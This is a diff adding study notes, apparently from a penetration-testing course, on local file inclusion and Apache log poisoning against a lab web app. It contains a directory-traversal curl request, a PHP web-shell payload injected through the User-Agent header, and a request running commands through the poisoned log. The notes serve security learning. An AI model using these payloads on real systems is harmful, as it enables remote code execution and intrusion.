@@ -76,6 +76,30 @@ However encoding slashes in the regular url will break the request.... Is this o
 
 Something else I noticed is that non-encoded payloads need the --path-as-is argument. Encoded payloads work the same with or without the argument
 
+## 9.2. File Inclusion Vulnerabilities
+no notes
+
+### 9.2.1. Local File Inclusion (LFI)
+directory traversal -- obtain the contents of a file outside of the web server's web root -- read files
+file inclusion -- include a file in the application's running code. -- execute local or remote files, also display content of non-executable file
+Log Poisoning --  modifying data sent to a webapp so that the logs have executable code
+
+Apache Access.log File Inclusion
+access.log is in /var/log/apache2/
+
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+They noticed that the log has an entry of a User Agent which is a user controlled header
+
+User-Agent payload in burp:
+<?php echo system($_GET['cmd']); ?>
+$_Get -- super global variable which lets you pull the contents of "cmd" from /index.php?page=admin.php&cmd=whoami
+echos the results of system(stuff)
+
+GET /meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=ls%20-la 
+%20 -- encoding of white space in command
+Previously we uploaded <?php echo system($_GET['cmd']); ?> to the log. Doing a directory traversal to that file executes the php code in the file which grabs the cmd parameter.
+the cmd parameter has ls -la with the space inbetween url encoded
+
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
@@ -83,6 +107,11 @@ Something else I noticed is that non-encoded payloads need the --path-as-is argu
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
 Extra Reading   
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><
+
+9.2. File Inclusion Vulnerabilities
+https://en.wikipedia.org/wiki/File_inclusion_vulnerability
+https://www.php.net/manual/en/wrappers.php
+
 9.1.3. Encoding Special Characters
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
 https://en.wikipedia.org/wiki/Web_application_firewall
